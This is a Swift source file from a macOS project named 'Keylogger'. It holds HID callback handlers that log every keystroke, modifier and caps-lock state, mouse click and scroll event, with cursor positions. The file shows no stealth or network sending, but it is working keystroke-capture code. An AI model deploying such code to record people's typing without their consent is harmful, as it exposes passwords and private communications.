//
//  CallBackFunctions.swift
//  Keylogger
//
//  Created by Cyril Zakka on 10/25/24.
//

import Foundation
import Cocoa
import os

class CallBackFunctions {
    static var CAPSLOCK = false
    static var calendar = Calendar.current
    
    static func getSensitivityThreshold() -> Int {
        let defaults = UserDefaults.standard
        return defaults.integer(forKey: "scrollSensitivity")
    }
    
    static func getMousePosition() -> String {
        let mouseLocation = NSEvent.mouseLocation
        let x = Int(round(mouseLocation.x))
        let y = Int(round(mouseLocation.y))
        return "(x:\(x), y:\(y))"
    }
    
    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
        let timeStamp = "\n[" + Date().description(with: Locale.current) + "] Device Connected: \(device)\n"
        print(timeStamp)
    }
    
    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
        let timeStamp = "\n[" + Date().description(with: Locale.current) + "] Device Disconnected: \(device)\n"
        print(timeStamp)
    }
    
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device)
        let usagePage = IOHIDElementGetUsagePage(elem)
        let usage = IOHIDElementGetUsage(elem)
        let pressed = IOHIDValueGetIntegerValue(device)
        
        // Handle keyboard input
        if usagePage == 0x07 {
            if (usage < 4 || usage > 231) {
                return
            }
            
            Outside:if pressed == 1 {
                if usage == 57 {
                    CallBackFunctions.CAPSLOCK = !CallBackFunctions.CAPSLOCK
                    break Outside
                }
                if usage >= 224 && usage <= 231 {
                    mySelf.writeToLog(mySelf.keyMap[usage]![0] + "(")
                    break Outside
                }
                if CallBackFunctions.CAPSLOCK {
                    mySelf.writeToLog(mySelf.keyMap[usage]![1])
                } else {
                    mySelf.writeToLog(mySelf.keyMap[usage]![0])
                }
            } else {
                if usage >= 224 && usage <= 231 {
                    mySelf.writeToLog(")")
                }
            }
            return
        }
        
        if usagePage == kHIDPage_Button || usagePage == 0x0D { // Added 0x0D for trackpad gestures
            if pressed == 1 { // Button press
                let pos = getMousePosition()
                switch (usagePage, usage) {
                case (UInt32(kHIDPage_Button), 1):
                    mySelf.writeToLog("\n[MOUSE_LEFT_CLICK \(pos)]")
                case (UInt32(kHIDPage_Button), 2), (0x0D, 2):
                    mySelf.writeToLog("\n[MOUSE_RIGHT_CLICK \(pos)]")
                case (UInt32(kHIDPage_Button), 3):
                    mySelf.writeToLog("\n[MOUSE_MIDDLE_CLICK \(pos)]")
                default:
                    mySelf.writeToLog("\n[MOUSE_BUTTON_\(usage) \(pos)]")
                }
            }
            return
        }
        
        // Handle scroll wheel and trackpad scrolling
        if usagePage == kHIDPage_GenericDesktop {
            let pos = getMousePosition()
            
            switch usage {
            case UInt32(kHIDUsage_GD_Wheel):
                let scrollValue = IOHIDValueGetIntegerValue(device)
                if scrollValue > 0 {
                    mySelf.writeToLog("\n[SCROLL_UP \(pos)]")
                } else if scrollValue < 0 {
                    mySelf.writeToLog("\n[SCROLL_DOWN \(pos)]")
                }
            case UInt32(kHIDUsage_GD_Y):  // Trackpad vertical scroll
                let scrollValue = IOHIDValueGetIntegerValue(device)
                if abs(scrollValue) > 50 {  // Increased threshold for less sensitivity
                    if scrollValue > 0 {
                        mySelf.writeToLog("\n[SCROLL_UP \(pos)]")
                    } else {
                        mySelf.writeToLog("\n[SCROLL_DOWN \(pos)]")
                    }
                }
            case UInt32(kHIDUsage_GD_X):  // Trackpad horizontal scroll
                let scrollValue = IOHIDValueGetIntegerValue(device)
                if abs(scrollValue) > 50 {  // Increased threshold for less sensitivity
                    if scrollValue > 0 {
                        mySelf.writeToLog("\n[SCROLL_RIGHT \(pos)]")
                    } else {
                        mySelf.writeToLog("\n[SCROLL_LEFT \(pos)]")
                    }
                }
            default:
                break
            }
        }
    }
}
